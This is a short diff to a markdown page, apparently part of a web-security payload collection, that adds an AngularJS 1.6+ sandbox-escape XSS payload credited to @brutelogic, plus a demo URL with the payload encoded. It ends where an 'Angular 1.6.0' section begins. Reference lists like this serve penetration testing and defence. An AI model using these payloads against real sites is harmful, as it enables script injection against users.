@@ -1,5 +1,13 @@
 # XSS in Angular
 
+Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
+
+```javascript
+{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
+```
+
+Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)
+
 Angular 1.6.0
 
 ```javascript
